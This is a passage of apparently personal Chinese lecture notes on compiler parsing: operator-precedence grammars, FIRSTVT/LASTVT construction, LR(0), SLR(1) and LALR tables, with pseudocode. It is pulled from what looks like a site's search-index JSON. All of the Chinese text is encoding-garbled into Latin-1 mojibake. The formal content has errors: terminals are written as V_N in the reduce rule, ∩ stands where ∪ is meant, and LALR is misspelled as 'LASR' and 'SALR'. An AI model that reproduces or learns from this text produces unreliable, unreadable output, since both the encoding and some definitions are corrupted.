å¦‚æœä¸€ä¸ªæ–‡æ³•çš„ä»»ä¸€äº§ç”Ÿå¼çš„å³éƒ¨éƒ½ä¸å«ä¸¤ä¸ªç›¸ç»§çš„éç»ˆç»“ç¬¦ï¼Œå³ä¸å« ...QR... å½¢å¼çš„äº§ç”Ÿå¼å³éƒ¨ï¼Œåˆ™æˆ‘ä»¬ç§°è¯¥æ–‡æ³•ä¸ºç®—ç¬¦æ–‡æ³•ã€‚ å‡è®¾ G æ˜¯ä¸€ä¸ªä¸å« $$\\epsilon$$-äº§ç”Ÿå¼çš„ç®—ç¬¦æ–‡æ³•ã€‚å¯¹äºä»»ä½•ä¸€å¯¹ç»ˆç»“ç¬¦ aã€bï¼Œæˆ‘ä»¬è¯´ï¼š  $$a \\doteq b$$ï¼Œå½“ä¸”ä»…å½“æ–‡æ³• G ä¸­å«æœ‰å½¢å¦‚ $$P \\rightarrow \u0026hellip;ab\u0026hellip;$$ æˆ– $$P \\rightarrow \u0026hellip;aQb\u0026hellip;$$ çš„äº§ç”Ÿå¼ $$a \\lessdot b$$ï¼Œå½“ä¸”ä»…å½“ G ä¸­å«æœ‰å½¢å¦‚ $$P \\rightarrow \u0026hellip;aR\u0026hellip;$$ çš„äº§ç”Ÿå¼ï¼Œä¸”æœ‰ $$R \\overset{+}{\\Rightarrow} b\u0026hellip;$$ æˆ– $$R \\overset{+}{\\Rightarrow} Qb\u0026hellip;$$ $$a \\gtrdot b$$ï¼Œå½“ä¸”ä»…å½“ G ä¸­å«æœ‰å½¢å¦‚ $$P \\rightarrow \u0026hellip;Rb\u0026hellip;$$ çš„äº§ç”Ÿå¼ï¼Œä¸”æœ‰ $$R \\overset{+}{\\Rightarrow} \u0026hellip;a$$ æˆ– $$R \\overset{+}{\\Rightarrow} \u0026hellip;aQ$$   å¦‚æœä¸€ä¸ªç®—ç¬¦æ–‡æ³• G ä¸­çš„ä»»ä½•ç»ˆç»“ç¬¦å¯¹ $$(a, b)$$ï¼Œè‡³å¤šåªæ»¡è¶³ $$a \\doteq b$$ã€$$a \\lessdot b$$ å’Œ $$a \\gtrdot b$$ è¿™ä¸‰ä¸ªå…³ç³»ä¹‹ä¸€ï¼Œåˆ™ç§° G æ˜¯ä¸€ä¸ªç®—ç¬¦ä¼˜å…ˆæ–‡æ³•ã€‚  æ„é€ ä¼˜å…ˆå…³ç³»è¡¨ #  ç®—æ³•ï¼š\n ç¡®å®šæ‰€æœ‰æ»¡è¶³ $$\\doteq$$ çš„æ‰€æœ‰ç»ˆç»“ç¬¦å¯¹ï¼š  é€šè¿‡æ£€æŸ¥ G çš„æ¯ä¸ªäº§ç”Ÿå¼çš„å€™é€‰å¼ï¼›   ç¡®å®šæ»¡è¶³å…³ç³» $$\\lessdot$$ å’Œ $$\\gtrdot$$ çš„æ‰€æœ‰ç»ˆç»“ç¬¦å¯¹ï¼š  å…ˆæ„é€ ä¸‹é¢ä¸¤ä¸ªé›†åˆï¼š  $$FIRSTVT(P) = {a | P \\overset{+}{\\Rightarrow} a\u0026hellip; \\or P \\overset{+}{\\Rightarrow} Qa\u0026hellip;, a \\in V_T \\and Q \\in V_N}$$ $$LASTVT(P) = {a | P \\overset{+}{\\Rightarrow} \u0026hellip;a \\or P \\overset{+}{\\Rightarrow} \u0026hellip;aQ, a \\in V_T \\and Q \\in V_N}$$   æ£€æŸ¥æ¯ä¸ªäº§ç”Ÿå¼çš„å€™é€‰å¼ï¼š  å‡å®šä¸€ä¸ªäº§ç”Ÿå¼æœ‰ä¸€ä¸ªå€™é€‰å¼ä¸º $$\u0026hellip;aP\u0026hellip;$$ï¼Œé‚£ä¹ˆï¼Œå¯¹äºä»»ä½• $$b \\in FIRSTVT(P)$$ï¼Œæˆ‘ä»¬éƒ½æœ‰ $$a \\lessdot bâ€‹$$ï¼› å‡å®šä¸€ä¸ªäº§ç”Ÿå¼æœ‰ä¸€ä¸ªå€™é€‰å¼å½¢ä¸º $$\u0026hellip;Pb\u0026hellip;$$ï¼Œé‚£ä¹ˆï¼Œå¯¹äºä»»ä½• $$a \\in LASTVT(P)$$ï¼Œæœ‰ $$a \\gtrdot b$$ã€‚      æ„é€ é›†åˆ $$FIRSTVT(P)$$ çš„ç®—æ³•ï¼š\n åå¤ä½¿ç”¨ä¸‹é¢çš„ä¸¤æ¡è§„åˆ™æ„é€ é›†åˆ $$FIRSTVT(P)$$ï¼š  è‹¥æœ‰äº§ç”Ÿå¼ $$P \\rightarrow a\u0026hellip;$$ æˆ– $$P \\rightarrow Qa\u0026hellip;$$ï¼Œåˆ™ $$FIRSTVT(P) += {a}$$ è‹¥ $$\\exist P \\rightarrow Q\u0026hellip;$$ï¼Œåˆ™ $$FIRSTVT(P) += FIRSTVT(Q)$$   ä¸æ–­æ‰«æï¼Œç›´åˆ°åœ¨ä¸€æ•´æ¬¡æ‰«æä¸­æ²¡æœ‰ä¸€ä¸ª $$FIRSTVT$$ é›†åˆå‘ç”Ÿå˜åŒ–ã€‚  ä¸€ä¸ªå®ç°çš„ä¼ªä»£ç ï¼š\nGLOBAL:\rSTACK stack;\rBOOLEN array[ size(V_N) ][ size(V_T) ];\rINIT:\rfor prod in PROD; do\ra = prod.right.first_V_T()\rp = prod.left\rarray[p][a] = true\rstack.push([p, a])\rdone\rMAIN:\rwhile not stack.empty(); do\rtop = stack.pop()\rQ, a = top[0], top[1]\rfor prod in PROD; do\rQc = prod.right.first_symbol()\rP = prod.left\rif (Qc is Q) and (array[P][a] is false); then\rarray[P][a] = true\rstack.push([P, a])\rendif\rdone\rdone å…¶ä¸­ array[P][] ä¸­æ‰€æœ‰ä¸º true çš„åˆ—å°±æ˜¯ $$FIRSTVT(P)$$ é›†åˆã€‚\nåŒç†å¯ä»¥æ„é€  $$LASTVT(P)$$ é›†åˆï¼š\n åå¤ä½¿ç”¨ä¸‹é¢çš„ä¸¤æ¡è§„åˆ™æ„é€ é›†åˆ $$LASTVT(P)$$ï¼š  è‹¥æœ‰äº§ç”Ÿå¼ $$P \\rightarrow \u0026hellip;b$$ æˆ– $$P \\rightarrow \u0026hellip;Qb$$ï¼Œåˆ™ $$LASTVT(P) += {b}$$ è‹¥ $$\\exist P \\rightarrow \u0026hellip;Q$$ï¼Œåˆ™ $$LASTVT(P) += LASTVT(Q)$$   ä¸æ–­æ‰«æï¼Œç›´åˆ°åœ¨ä¸€æ•´æ¬¡æ‰«æä¸­æ²¡æœ‰ä¸€ä¸ª $$LASTVT$$ é›†åˆå‘ç”Ÿå˜åŒ–ã€‚  åŒæ ·çš„ä¹Ÿå¯ä»¥å†™å‡ºä¼ªä»£ç å®ç°ã€‚\nç®—ç¬¦ä¼˜å…ˆåˆ†æç®—æ³• #  æ¦‚å¿µï¼š\n ç´ çŸ­è¯­ï¼šè‡³å°‘å«æœ‰ä¸€ä¸ªç»ˆç»“ç¬¦ä¸”ä¸å†å«ä»»ä½•æ¯”å®ƒè‡ªèº«æ›´å°çš„ç´ çŸ­è¯­ã€‚ æœ€å·¦ç´ çŸ­è¯­ï¼šå¤„äºå¥å‹æœ€å·¦è¾¹çš„é‚£ä¸ªç´ çŸ­è¯­ã€‚  æœ€å·¦ç´ çŸ­è¯­å®šç†ï¼š\n  ç®—ç¬¦ä¼˜å…ˆæ–‡æ³•å¥å‹çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š\n$$\\begin{align}sentence: \u0026amp;#N_1a_1N_2a_2\u0026hellip;N_na_nN_{n+1}#,\\ where: \u0026amp;\\forall i, a_i \\in V_T, N_i \\in V_N \\cap{\\epsilon}\\end{align}$$\n  åˆ™å®šç†ï¼šä¸€ä¸ªæ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„æœ€å·¦è¾¹çš„å­ä¸² $$N_ia_i\u0026hellip;N_ja_j$$ æ˜¯æœ€å·¦ç´ çŸ­è¯­ï¼š\n $$a_{i-1} \\lessdot a_i$$ $$\\forall s,t \\in [i, j], a_s \\doteq a_t$$ $$a_j \\gtrdot a_{j+1}$$    ç®—ç¬¦ä¼˜å…ˆåˆ†æç®—æ³•çš„ä¼ªä»£ç æè¿°ï¼š\nGLOBAL:\rSTACK analysis;\rSTACK input;\rINIT:\rtop = 1\ranalysis.push(\u0026#39;#\u0026#39;)\rMAIN:\rrepeat\ra = input.pop()\rj = (analysis[top] in V_T) ? top : top-1\r# WHILE:\r# repeat until the precedence of top symbol is greater than the next symbol\rwhile precedence_greater(S[j], a); do\r# REPEAT:\r# find the terminal symbol position in stack where its precedence is less than the continous topper one\rrepeat\rQ = analysis[j];\rj = (analysis[j-1] in V_T) ? j-1 : j-2;\runtil precedence_less(analysis[j], Q)\r# `REDUCT` function is used to reduct list of symbol into a non-terminal symbol.\rN = REDUCT(analysis[j+1], S[top]);\rtop = j+1\ranalysis[top] = N\rdone\r# IF:\r# if the next symbol is legal, push it into the stack\rif precedence_less(S[j], a) or precedence_equal(S[j], a); then\rtop++, S[top] = a;\relse ERROR; fi\runtil a is \u0026#39;#\u0026#39;; LR åˆ†ææ³• #  å®šä¹‰ #  è§„èŒƒè§„çº¦ï¼š\n å‡å®š $$\\alpha$$ æ˜¯æ–‡æ³• G çš„ä¸€ä¸ªå¥å­ä¸”æ»¡è¶³ä»¥ä¸‹çš„æ¡ä»¶ï¼Œåˆ™æˆ‘ä»¬ç§°åºåˆ— $$\\alpha_n, \\alpha_{n-1}, \u0026hellip;, \\alpha_0$$ æ˜¯ $$\\alpha$$ çš„ä¸€ä¸ªè§„èŒƒè§„çº¦ï¼š  $$\\alpha_n = \\alpha$$ $$\\alpha_0 = S$$ $$\\forall i, 0 \\lt i \\le n$$ï¼Œ$$\\alpha_{i-1}$$ æ˜¯ä» $$\\alpha_i$$ ç»æŠŠå¥æŸ„æ›¿æ¢æˆç›¸åº”äº§ç”Ÿå¼çš„å·¦éƒ¨ç¬¦å·å¾—åˆ°çš„ã€‚   NOTICEï¼šè§„èŒƒè§„çº¦å¾—åˆ°çš„æ ‘æ˜¯è¯­æ³•æ ‘ï¼Œä½†æ˜¯ç®—ç¬¦ä¼˜å…ˆåˆ†ææ–¹æ³•å¾—åˆ°çš„æ ‘ä¸æ˜¯è¯­æ³•æ ‘ï¼ˆç®—ç¬¦ä¼˜å…ˆåˆ†ææ–¹æ³•ä¸æ˜¯è§„èŒƒè§„çº¦ï¼‰ã€‚  è§„èŒƒæ¨å¯¼ï¼š\n å› ä¸ºè§„èŒƒè§„çº¦æ˜¯æœ€å·¦è§„çº¦ï¼Œè§„èŒƒè§„çº¦çš„é€†è¿‡ç¨‹å°±æ˜¯æœ€å³æ¨å¯¼ã€‚æœ€å³æ¨å¯¼ä¹Ÿç§°è§„èŒƒæ¨å¯¼ï¼Œç”±è§„èŒƒæ¨å¯¼æ¨å‡ºçš„å¥å‹åˆå«è§„èŒƒå¥å‹ã€‚  LR æ–‡æ³•ï¼š\n å¯¹äºä¸€ä¸ªæ–‡æ³•ï¼Œå¦‚æœèƒ½å¤Ÿæ„é€ ä¸€å¼ åˆ†æè¡¨ï¼Œä½¿å¾—å®ƒçš„æ¯ä¸ªå…¥å£å‡æ˜¯å”¯ä¸€ç¡®å®šçš„ï¼Œåˆ™è¿™ä¸ªæ–‡æ³•å°±ç§°ä¸º LR æ–‡æ³•ã€‚ ä¸€ä¸ªæ–‡æ³•ï¼Œå¦‚æœèƒ½å¤Ÿç”¨ä¸€ä¸ªæ¯æ­¥æœ€å¤šå‘å‰æ£€æŸ¥ k ä¸ªè¾“å…¥ç¬¦å·çš„ LR åˆ†æå™¨è¿›è¡Œåˆ†æï¼Œåˆ™è¿™ä¸ªæ–‡æ³•å°±ç§°ä½œ LR(k) æ–‡æ³•ã€‚ LR æ–‡æ³• $$\\subset$$ æ— äºŒä¹‰æ–‡æ³•ã€‚  LR åˆ†æè¡¨ï¼šLR åˆ†æå™¨çš„æ ¸å¿ƒæ˜¯ä¸€å¼ åˆ†æè¡¨ï¼š\n ACTION[s, a]ï¼šå½“å‰çŠ¶æ€ s é¢ä¸´è¾“å…¥ç¬¦å· a æ—¶ï¼Œåº”è¯¥é‡‡å–ä»€ä¹ˆåŠ¨ä½œã€‚æ¯”å¦‚ï¼š  s5ï¼šè¡¨ç¤º shiftï¼Œè¡¨ç¤ºæŠŠå½“å‰æ–‡æ³•ç¬¦å·ç§»è¿›å…¥æ ˆï¼Œå¹¶ä¸”å°†çŠ¶æ€ 5 å‹æ ˆã€‚ r4ï¼šè¡¨ç¤º reduceï¼Œè¡¨ç¤ºç”¨ç¬¬ 4 ä¸ªäº§ç”Ÿå¼è§„çº¦ï¼ŒæŠŠäº§ç”Ÿå¼å³éƒ¨å’ŒçŠ¶æ€å¼¹å‡ºæ ˆï¼ŒæŠŠ GOTO[æ ˆé¡¶çŠ¶æ€, äº§ç”Ÿå¼å·¦éƒ¨] å’Œ äº§ç”Ÿå¼å·¦éƒ¨ éç»ˆç»“ç¬¦ç§»å…¥æ ˆã€‚   GOTO[s, X]ï¼šçŠ¶æ€ s é¢å¯¹æ–‡æ³•ç¬¦å· X æ—¶ï¼Œä¸‹ä¸€ä¸ªçŠ¶æ€æ˜¯ä»€ä¹ˆã€‚ accï¼šå®£å¸ƒåˆ†ææˆåŠŸï¼Œåœæ­¢åˆ†æå™¨å·¥ä½œã€‚ ç©ºç™½ï¼šä¸å…è®¸å‡ºç°çš„æƒ…å†µï¼Œå‡ºç°äº†éœ€è¦æŠ¥é”™ã€‚  æ´»å‰ç¼€ #  å­—çš„å‰ç¼€ã€æ´»å‰ç¼€ï¼š\n å­—çš„å‰ç¼€ï¼šå­—çš„ä»»æ„é¦–éƒ¨ã€‚ æ´»å‰ç¼€ï¼šæŒ‡è§„èŒƒå¥å‹çš„ä¸€ä¸ªå‰ç¼€ï¼Œè¿™ç§å‰ç¼€ä¸å«å¥æŸ„ä¹‹åçš„ä»»æ„ç¬¦å·ã€‚  å³ï¼šå¦‚æœ $$\\beta$$ æ˜¯ $$\\alpha \\beta \\delta$$ çš„å¥æŸ„ï¼Œå¦‚æœ $$\\alpha \\beta = u_1 u_2 \u0026hellip; u_r$$ï¼Œåˆ™ç¬¦å·ä¸² $$u_1 u_2 \u0026hellip; u_i (1 \\le i \\le r)$$ æ˜¯ $$\\alpha \\beta \\delta$$ çš„ä¸€ä¸ªæ´»å‰ç¼€ã€‚    æ‹“å¹¿æ–‡æ³•ï¼š\n æ„é€ æ–‡æ³• G\u0026rsquo;ï¼Œå®ƒåŒ…å«äº†æ•´ä¸ª Gï¼Œå¹¶ä¸”å¼•è¿›ä¸å‡ºç°åœ¨ G ä¸­çš„æ–°çš„å¼€å§‹ç¬¦å·éç»ˆç»“ç¬¦ S\u0026rsquo;ã€ä»¥åŠäº§ç”Ÿå¼ $$S\u0026rsquo; \\rightarrow S$$ã€‚  $$LR(0)$$ é¡¹ç›®ï¼š\n åœ¨æ¯ä¸ªäº§ç”Ÿå¼å³éƒ¨æ·»åŠ ä¸€ä¸ªåœ†ç‚¹ï¼Œè¡¨ç¤ºæˆ‘ä»¬åœ¨åˆ†æè¿‡ç¨‹ä¸­çœ‹åˆ°äº†äº§ç”Ÿå¼çš„å¤šå¤§éƒ¨åˆ†ã€‚ $$A \\rightarrow \\alpha \\cdot$$ ç§°ä¸º â€œè§„çº¦é¡¹ç›®â€ $$S\u0026rsquo; \\rightarrow \\alpha \\cdot$$ ç§°ä¸º â€œæ¥å—é¡¹ç›®â€ï¼ˆâ€œæ¥å—é¡¹ç›®â€ $$\\subset$$ â€œè§„çº¦é¡¹ç›®â€ï¼‰ $$A \\rightarrow \\alpha \\cdot a \\beta$$ ç§°ä¸º â€œç§»è¿›é¡¹ç›®â€ $$A \\rightarrow \\alpha \\cdot B \\beta$$ ç§°ä¸º â€œå¾…çº¦é¡¹ç›®â€  æ„é€ è¯†åˆ«æ´»å‰ç¼€çš„ DFAï¼š\n  æ„é€ è¯†åˆ«æ–‡æ³•æ‰€æœ‰æ´»å‰ç¼€çš„ NFAï¼š\n  ${\\displaystyle State(i): X \\rightarrow X_1 X_2 \u0026hellip; X_{i-1} \\cdot X_i\u0026hellip;X_n}$\n${\\displaystyle State(j):X \\rightarrow X_1 X_2\u0026hellip;X_i \\cdot X_{i+1} \u0026hellip; X_n}$\n${\\displaystyle \\Rightarrow f(State(i), X_i) = State(j) }$\n  ${\\displaystyle State(i): X \\rightarrow \\alpha \\cdot A \\beta}$\n$ State(j): A \\rightarrow \\cdot \\gamma $\n$\\Rightarrow f(State(i), \\epsilon) = State(j) $\n    æŠŠè¯¥è¯†åˆ«æ–‡æ³•æ‰€æœ‰æ´»å‰ç¼€çš„ NFA ç¡®å®šåŒ–ä¸º DFAã€‚\n  PSï¼šæ„æˆè¯†åˆ«ä¸€ä¸ªæ–‡æ³•æ´»å‰ç¼€çš„ DFA çš„é¡¹ç›®é›†ï¼ˆçŠ¶æ€ï¼‰çš„å…¨ä½“ç§°ä¸ºæ–‡æ³•çš„ LR(0) é¡¹ç›®é›†è§„èŒƒæ—ã€‚\n  æ„é€ çš„å¦ä¸€ç§æ–¹æ³•ï¼ˆé€šè¿‡æœ‰æ•ˆé¡¹ç›®é›†ï¼‰ï¼š\n  æœ‰æ•ˆé¡¹ç›®ï¼šé¡¹ç›® $$A \\rightarrow \\beta_1 \\cdot \\beta_2$$ å¯¹æ´»å‰ç¼€ $$\\alpha \\beta_1$$ æ˜¯æœ‰æ•ˆçš„ï¼Œå¦‚æœå­˜åœ¨è§„èŒƒæ¨å¯¼ï¼š$$S\u0026rsquo; \\overset{*}{\\Rightarrow}_R \\alpha A \\omega \\Rightarrow_R \\alpha \\beta_1 \\beta_2 \\omega $$\n  å®šç†ï¼šè‹¥é¡¹ç›® $$A \\rightarrow \\alpha \\cdot B \\beta$$ å¯¹äºæ´»å‰ç¼€ $$\\eta = \\delta \\alpha$$ æ˜¯æœ‰æ•ˆçš„ä¸” $$B \\rightarrow \\gamma$$ æ˜¯ä¸€ä¸ªäº§ç”Ÿå¼ï¼Œåˆ™é¡¹ç›® $$B \\rightarrow \\cdot \\gamma$$ å¯¹ $$\\eta = \\delta \\alpha$$ ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚\n  æ„é€ é¡¹ç›®é›† I çš„é—­åŒ… $$CLOSURE(I)$$ï¼š\n I çš„ä»»ä½•é¡¹ç›®éƒ½å±äº $$CLOSURE(I)$$ï¼› è‹¥ $$A \\rightarrow \\alpha \\cdot B \\beta$$ å±äºï¼Œä»»æ„å…³äº B çš„äº§ç”Ÿå¼ $$B \\rightarrow \\gamma$$ï¼Œé¡¹ç›® $$B \\rightarrow \\cdot \\gamma$$ ä¹Ÿå±äº $$CLOSURE(I)$$ï¼› é‡å¤æ‰§è¡Œä¸Šè¿°ä¸¤æ­¥ç›´è‡³ $$CLOSURE(I)$$ ä¸å†å¢å¤§ä¸ºæ­¢ã€‚    çŠ¶æ€è½¬æ¢å‡½æ•° GOï¼šå¯¹äº I æ˜¯ä¸€ä¸ªé¡¹ç›®é›†ï¼ŒX æ˜¯ä¸€ä¸ªæ–‡æ³•ç¬¦å·ï¼Œåˆ™ï¼š\n$$\\begin{align} GO(I, X) \u0026amp;= CLOSURE(J) \\where\\ J \u0026amp;= {A \\rightarrow \\alpha X \\cdot \\beta \\mid (A \\rightarrow \\alpha \\cdot X \\beta) \\in I} \\end{align}$$\n  æ„é€ æ–¹æ³•ï¼š\n  $$State := {CLOSURE({S\u0026rsquo; \\rightarrow \\cdot S})}$$\n  å¯¹äº State ä¸­çš„æ¯ä¸ªé¡¹ç›®é›† I å’Œ G\u0026rsquo; ä¸­çš„æ¯ä¸ªæ–‡æ³•ç¬¦å· Xï¼š\n$$State += GO(I, X), where\\ GO(I, X) \\neq \\varnothing \\and GO(I, X) \\notin State $$\n  é‡å¤ç¬¬äºŒæ­¥ç›´åˆ° State ä¸å†å¢å¤§ã€‚\n    LR(0) åˆ†æè¡¨ #  å‡è‹¥ä¸€ä¸ªæ–‡æ³• G çš„æ‹“å±•æ–‡æ³• G\u0026rsquo; çš„æ´»å‰ç¼€è¯†åˆ«è‡ªåŠ¨æœºä¸­çš„æ¯ä¸ªçŠ¶æ€ï¼ˆé¡¹ç›®é›†ï¼‰ä¸å­˜åœ¨ä»¥ä¸‹çš„æƒ…å†µï¼Œåˆ™ç§° G æ˜¯ä¸€ä¸ª LR(0) æ–‡æ³•ã€‚\n æ—¢å«ç§»è¿›é¡¹ç›®åˆå«è§„çº¦é¡¹ç›®ï¼› å«æœ‰å¤šä¸ªè§„çº¦é¡¹ç›®ã€‚  æ„é€  LR(0) åˆ†æè¡¨çš„ç®—æ³•ï¼š\n ä»¤æ¯ä¸ªé¡¹ç›®é›† $$I_k$$ çš„ä¸‹æ ‡ k ä½œä¸ºåˆ†æå™¨çš„çŠ¶æ€ï¼ŒåŒ…å«é¡¹ç›® $$S\u0026rsquo; \\rightarrow \\cdot S$$ çš„é›†åˆ $$I_k$$ çš„ä¸‹æ ‡ k ä¸ºåˆ†æå™¨çš„åˆå§‹çŠ¶æ€ã€‚ æ„é€ åˆ†æè¡¨çš„ ACTION å­è¡¨ï¼š  è‹¥é¡¹ç›® $$A \\rightarrow \\alpha \\cdot a \\beta$$ å±äº $$I_k$$ ä¸” $$GO(I_k, a) = I_j$$ï¼Œa ä¸ºç»ˆç»“ç¬¦ï¼Œåˆ™ç½® $$ACTION[k, a] = \u0026ldquo;sj\u0026rdquo;$$ï¼ˆåŠ¨ä½œç§»è¿›ï¼Œè¿›å…¥çŠ¶æ€jï¼‰ è‹¥é¡¹ç›® $$A \\rightarrow \\alpha \\cdot$$ å±äº $$I_k$$ï¼Œé‚£ä¹ˆï¼Œ$$\\forall a \\in V_N, a \\in FOLLOW(A)$$ï¼Œç½® $$ACTION[k, a] = \u0026ldquo;rj\u0026rdquo;$$ï¼ˆåŠ¨ä½œè§„çº¦ï¼Œä½¿ç”¨ç¬¬ j ä¸ªäº§ç”Ÿå¼ $$A \\rightarrow \\alpha$$ï¼‰ è‹¥é¡¹ç›® $$S\u0026rsquo; \\rightarrow S \\cdot$$ å±äº $$I_k$$ï¼Œåˆ™ç½® $$ACTION[k, $] = \u0026ldquo;acc\u0026rdquo;$$ï¼ˆåŠ¨ä½œæ¥å—ï¼‰   æ„é€ åˆ†æè¡¨çš„ GOTO å­è¡¨ï¼š  è‹¥ $$GO(I_k, A) = I_j$$ï¼Œå…¶ä¸­ A ä¸ºéç»ˆç»“ç¬¦ï¼Œåˆ™ç½® $$GOTO[k, A] = j$$ï¼ˆåœ¨ç¬¬ k ä¸ªçŠ¶æ€ï¼Œæ ˆé¡¶æ˜¯ A ç¬¦æ—¶ï¼Œä¸‹ä¸€ä¸ªçŠ¶æ€æ˜¯ jï¼‰   åˆ†æè¡¨ä¸­å‡¡ä¸èƒ½ç”¨è§„åˆ™ä¸Šè¿°è§„åˆ™å¡«å…¥ä¿¡æ¯çš„ç©ºç™½æ ¼å‡å¡«å…¥ â€œæŠ¥é”™æ ‡å¿—â€ã€‚  SLR(1) åˆ†ææ³• #  LR(0) ä¸­ï¼Œä¸€ä¸ªé¡¹ç›®é›†å¯èƒ½ä¼šåŒ…å«å¤šä¸ªè§„çº¦é¡¹ç›®ï¼Œå› ä¸ºè§„çº¦ä½¿ç”¨çš„è§„åˆ™å¿…é¡»å‘å‰çœ‹ä¸€ä¸ªå•è¯æ‰å¯ä»¥é€‰æ‹©è§„åˆ™è¿›è¡Œè§„çº¦ï¼Œå› æ­¤å¼•å…¥äº† SLR(1) åˆ†ææ³•ã€‚å…¶ä¸­ S æŒ‡ Simpleï¼Œ1 æŒ‡æœ€å¤šå‘å‰çœ‹ä¸€ä¸ªå•è¯ã€‚\nLR(0) å†²çªè§£å†³åŠæ³•ï¼š\n å‡å®šä¸€ä¸ª $$LR(0)$$ è§„èŒƒæ—ä¸­å«æœ‰å¦‚ä¸‹çš„é¡¹ç›®é›† $$I = {X \\rightarrow a \\cdot b \\beta, A \\rightarrow \\alpha \\cdot, B \\rightarrow \\alpha \\cdot}$$ï¼Œå…¶ä¸­ï¼š$$I \\in S, FOLLOW(A) \\cap FOLLOW(B) = \\varnothing, b \\notin FOLLOW(A) \\cup FOLLOW(B)$$ å½“çŠ¶æ€ I é¢ä¸´è¾“å…¥ç¬¦å· a æ—¶ï¼Œå¯ä»¥ï¼š  è‹¥ $$a = b$$ï¼Œåˆ™ç§»è¿› è‹¥ $$a \\in FOLLOW(A)$$ï¼Œç”¨äº§ç”Ÿå¼ $$A \\rightarrow \\alpha$$ è¿›è¡Œè§„çº¦ï¼› è‹¥ $$a \\in FOLLOW(B)$$ï¼Œç”¨äº§ç”Ÿå¼ $$B \\rightarrow \\alpha$$ è¿›è¡Œè§„çº¦ï¼› æ­¤å¤–ï¼ŒæŠ¥é”™ã€‚    æ›´ä¸€èˆ¬çš„ï¼š\n å‡å®šä¸€ä¸ª $$LR(0)$$ è§„èŒƒæ—ä¸­å«æœ‰å¦‚ä¸‹çš„é¡¹ç›®é›† $$I = {A_1 \\rightarrow \\alpha \\cdot a_1 \\beta_1, A_2 \\rightarrow \\alpha \\cdot a_2 \\beta_2, \u0026hellip;, A_m \\rightarrow \\alpha \\cdot a_m \\beta_m, B_1 \\rightarrow \\alpha \\cdot, B_2 \\rightarrow \\alpha \\cdot, \u0026hellip;, B_n \\rightarrow \\alpha \\cdot }$$ï¼Œå…¶ä¸­ï¼š$$I \\in S; \\forall k \\le m, i,j \\le n, FOLLOW(B_i) \\cap FOLLOW(B_j) = \\varnothing, b_k \\notin FOLLOW(B_i) \\cup FOLLOW(B_j)$$ å½“çŠ¶æ€ I é¢ä¸´è¾“å…¥ç¬¦å· a æ—¶ï¼Œå¯ä»¥ï¼š  è‹¥ $$a \\in {a_i \\mid 0 \u0026lt; i \\le m }$$ï¼Œåˆ™ç§»è¿› è‹¥ $$a \\in FOLLOW(B_i), 0 \u0026lt; i \\le n$$ï¼Œç”¨äº§ç”Ÿå¼ $$B_i \\rightarrow \\alpha$$ è¿›è¡Œè§„çº¦ï¼› æ­¤å¤–ï¼ŒæŠ¥é”™ã€‚    LASR(1) åˆ†ææ³• #  å¯ä»¥æ„é€ ä¸€ä¸ªæ¯”è§„èŒƒ LR åˆ†æè¡¨æ›´å°çš„åˆ†æè¡¨ã€‚å…¶ä¸­ LA æŒ‡ lookheadã€‚\nåŒå¿ƒé¡¹ç›®é›†ï¼šï¼ˆæ²¡çœ‹æ‡‚ï¼‰\nå¯¹äºä¸€ä¸ªæ‹“å¹¿æ–‡æ³• G\u0026rsquo;ï¼Œæ„é€  LASR(1) çš„åˆ†æè¡¨æ–¹æ³•å¦‚ä¸‹ï¼š\n æ„é€  LR(1) é¡¹ç›®é›†è§„èŒƒæ— $$C = {I_0, I_1, \u0026hellip;, I_n}$$ å°†åŒå¿ƒé›†åˆå¹¶ ä»¤ $$C\u0026rsquo; = {J_0, \u0026hellip;, J_m}$$ ä¸ºåˆå¹¶åé¡¹ç›®é›†ï¼Œæ„é€  action å­è¡¨ï¼Œå¦‚æœæœ‰å†²çªåˆ™åˆå¹¶å¤±è´¥ï¼› ã€‚ã€‚ã€‚  LR åˆ†æäº§ç”Ÿå™¨ YACC #  YACC (Yet Another Compiler Compiler)\nLR çš„å˜ç§ï¼šSALR(1)\n"},{"id":374,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E5%B1%9E%E6%80%A7%E6%96%87%E6%B3%95%E5%92%8C%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E7%BF%BB%E8%AF%91/","title":"3.å±æ€§æ–‡æ³•å’Œè¯­æ³•åˆ¶å¯¼ç¿»è¯‘","section":"ç¼–è¯‘åŸç†","content":" å­¦ä¹ åœ°å€ï¼š\n å›½é˜²ç§‘æŠ€å¤§å­¦ä¸­å›½å¤§å­¦ MOOC   å±æ€§æ–‡æ³• #  æ¦‚å¿µ #  å±æ€§æ–‡æ³•ï¼š\n ä¹Ÿç§°ä½œå±æ€§ç¿»è¯‘æ–‡æ³• ä»¥ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ä¸ºåŸºç¡€  ä¸ºæ¯ä¸ªæ–‡æ³•ç¬¦å·ï¼ˆç»ˆç»“ç¬¦æˆ–éç»ˆç»“ç¬¦ï¼‰é…å¤‡è‹¥å¹²ç›¸å…³çš„ â€œå€¼â€ï¼ˆç§°ä¸ºå±æ€§ï¼‰ï¼Œä»£è¡¨ä¸æ–‡æ³•ç¬¦å·ç›¸å…³çš„ä¿¡æ¯ï¼Œå¦‚ç±»å‹ã€å€¼ã€ä»£ç åºåˆ—ã€ç¬¦å·è¡¨å†…å®¹ç­‰ã€‚ å¯¹äºæ–‡æ³•çš„æ¯ä¸ªäº§ç”Ÿå¼éƒ½é…å¤‡äº†ä¸€ç»„å±æ€§çš„è¯­ä¹‰è§„åˆ™ï¼Œå¯¹å±æ€§è¿›è¡Œè®¡ç®—å’Œä¼ é€’ã€‚    ç»¼åˆå±æ€§ï¼š\n è‡ªä¸‹è€Œä¸Šä¼ é€’ä¿¡æ¯ ä»è¯­æ³•è§„åˆ™è§’åº¦çœ‹ï¼šæ ¹æ®å³éƒ¨å€™é€‰å¼ä¸­çš„ç¬¦å·çš„å±æ€§è®¡ç®—å·¦éƒ¨è¢«å®šä¹‰ç¬¦å·çš„ç»¼åˆå±æ€§ ä»è¯­æ³•æ ‘è§’åº¦çœ‹ï¼šæ 